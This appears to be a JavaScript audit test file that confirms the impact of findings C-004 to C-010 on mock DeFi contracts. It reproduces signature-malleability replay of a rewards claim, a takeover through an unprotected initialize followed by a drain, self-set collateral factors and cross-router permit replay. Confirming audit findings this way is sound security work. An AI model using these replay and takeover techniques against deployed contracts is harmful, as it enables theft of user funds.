import assert from "node:assert/strict";
import { before, test } from "node:test";
import {
  blockDeadline,
  compileAll,
  deploy,
  ether,
  ethers,
  expectRevert,
  makeChain,
  send
} from "../../target/test/support.mjs";

const secp256k1N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n;
let artifacts;

before(async () => {
  artifacts = await compileAll();
});

function serializeSignature(r, s, v) {
  return ethers.hexlify(ethers.concat([r, s, ethers.toBeHex(v, 1)]));
}

async function deployMarket() {
  const chain = await makeChain();
  const [guardian, attacker] = chain.signers;
  const asset = await deploy(artifacts, "MockERC20", guardian, ["Aster Asset", "AST", 18]);
  const stable = await deploy(artifacts, "MockERC20", guardian, ["Aster Dollar", "aUSD", 18]);
  const vault = await deploy(artifacts, "AsterVault", guardian, [await asset.getAddress()]);
  const pool = await deploy(artifacts, "ReservePool", guardian, [
    await asset.getAddress(), await stable.getAddress()
  ]);
  const feed = await deploy(artifacts, "MockFeed", guardian, [8, 100_000_000]);
  const oracle = await deploy(artifacts, "ReserveOracle", guardian, [
    await feed.getAddress(), await pool.getAddress()
  ]);
  const market = await deploy(artifacts, "LendingMarket", guardian, [
    await stable.getAddress(), await vault.getAddress(), await oracle.getAddress(),
    await guardian.getAddress()
  ]);
  await send(stable.mint(await market.getAddress(), ether(10_000)));
  return { chain, guardian, attacker, asset, stable, vault, market };
}

async function collateralize(context) {
  const attackerAddress = await context.attacker.getAddress();
  await send(context.asset.mint(attackerAddress, ether(1_000)));
  await send(context.asset.connect(context.attacker).approve(
    await context.vault.getAddress(), ether(1_000)
  ));
  await send(context.vault.connect(context.attacker).deposit(ether(1_000), attackerAddress));
  await send(context.vault.connect(context.attacker).approve(
    await context.market.getAddress(), ether(1_000)
  ));
  await send(context.market.connect(context.attacker).depositCollateral(
    ether(1_000), attackerAddress
  ));
  return attackerAddress;
}

test("C-004 impact boundary: four raw encodings replay one authorization", async () => {
  const chain = await makeChain();
  const [admin, authority, claimant, relayer] = chain.signers;
  const authorityWallet = chain.wallets[1];
  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Reward", "ARW", 18]);
  const distributor = await deploy(artifacts, "RewardsDistributor", admin, [
    await token.getAddress(), await authority.getAddress()
  ]);
  const amount = ether(20);
  const account = await claimant.getAddress();
  const nonce = 99n;
  await send(token.mint(await distributor.getAddress(), amount * 4n));

  const payload = await distributor.claimPayload(account, amount, nonce);
  const signed = ethers.Signature.from(
    await authorityWallet.signMessage(ethers.getBytes(payload))
  );
  const highS = ethers.toBeHex(secp256k1N - BigInt(signed.s), 32);
  const highV = signed.v === 27 ? 28 : 27;
  const variants = [
    serializeSignature(signed.r, signed.s, signed.v),
    serializeSignature(signed.r, signed.s, signed.v - 27),
    serializeSignature(signed.r, highS, highV),
    serializeSignature(signed.r, highS, highV - 27)
  ];

  assert.equal(new Set(variants.map(ethers.keccak256)).size, 4);
  for (const variant of variants) {
    await send(distributor.connect(relayer).claim(account, amount, nonce, variant));
  }
  assert.equal(await token.balanceOf(account), amount * 4n);
  console.log(JSON.stringify({
    check: "C-004-four-encodings",
    distinctRawSignatures: variants.length,
    authorizedAmount: String(amount),
    paid: String(await token.balanceOf(account))
  }));
});

test("C-005 severity boundary: role overwrite enables arbitrary execute", async () => {
  const chain = await makeChain();
  const [admin, operator, attacker] = chain.signers;
  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
  const module = await deploy(artifacts, "StrategyModule", admin);
  const attackerAddress = await attacker.getAddress();
  await send(module.initialize(await admin.getAddress(), await operator.getAddress()));
  await send(token.mint(await module.getAddress(), ether(10)));

  const transferCall = token.interface.encodeFunctionData("transfer", [attackerAddress, ether(10)]);
  await expectRevert(module.connect(attacker).execute(await token.getAddress(), transferCall));
  await send(module.connect(attacker).initialize(attackerAddress, attackerAddress));
  await send(module.connect(attacker).execute(
    await token.getAddress(), transferCall, { gasLimit: 1_000_000 }
  ));

  assert.equal(await token.balanceOf(await module.getAddress()), 0n);
  assert.equal(await token.balanceOf(attackerAddress), ether(10));
  console.log(JSON.stringify({
    check: "C-005-execute-role",
    preSeizureExecuteRejected: true,
    postSeizureExecuteSucceeded: true,
    moduleBalance: String(await token.balanceOf(await module.getAddress())),
    attackerBalance: String(await token.balanceOf(attackerAddress))
  }));
});

test("C-006 severity boundary: raised factor preserves positive spot equity", async () => {
  const context = await deployMarket();
  const attackerAddress = await collateralize(context);
  await send(context.market.connect(context.attacker).setCollateralFactor(9_500));
  await send(context.market.connect(context.attacker).borrow(ether(949), attackerAddress, "0x"));

  const collateralValue = await context.market.collateralValue(attackerAddress);
  const debt = await context.market.debt(attackerAddress);
  assert.equal(collateralValue, ether(1_000));
  assert.equal(debt, ether(949));
  assert(debt < collateralValue);
  console.log(JSON.stringify({
    check: "C-006-static-solvency",
    collateralValue: String(collateralValue),
    debt: String(debt),
    immediateShortfall: "0",
    adverseMoveToShortfallBpsApprox: "510"
  }));
});

test("C-010 severity boundary: second router approval is required", async () => {
  const chain = await makeChain();
  const [admin, owner, recipient, relayer] = chain.signers;
  const ownerWallet = chain.wallets[1];
  const token = await deploy(artifacts, "MockERC20", admin, ["Aster Dollar", "aUSD", 18]);
  const routerA = await deploy(artifacts, "PermitRouter", admin);
  const routerB = await deploy(artifacts, "PermitRouter", admin);
  const ownerAddress = await owner.getAddress();
  const recipientAddress = await recipient.getAddress();
  const amount = ether(25);
  const deadline = await blockDeadline(chain.provider);

  await send(token.mint(ownerAddress, amount * 2n));
  await send(token.connect(owner).approve(await routerA.getAddress(), amount));
  const payload = ethers.keccak256(ethers.AbiCoder.defaultAbiCoder().encode(
    ["bytes32", "address", "address", "uint256", "uint256", "uint256"],
    [await routerA.TRANSFER_TYPEHASH(), ownerAddress, await token.getAddress(), amount, 0, deadline]
  ));
  const signature = await ownerWallet.signMessage(ethers.getBytes(payload));
  const args = [
    ownerAddress, await token.getAddress(), amount, recipientAddress, deadline, signature
  ];

  await send(routerA.connect(relayer).executeTransfer(...args));
  await expectRevert(routerB.connect(relayer).executeTransfer.staticCall(...args));
  assert.equal(await routerB.nonces(ownerAddress), 0n);
  await send(token.connect(owner).approve(await routerB.getAddress(), amount));
  await send(routerB.connect(relayer).executeTransfer(...args));
  assert.equal(await token.balanceOf(recipientAddress), amount * 2n);
  console.log(JSON.stringify({
    check: "C-010-second-approval",
    replayWithoutSecondApprovalRejected: true,
    replayAfterSecondApprovalSucceeded: true,
    received: String(await token.balanceOf(recipientAddress))
  }));
});
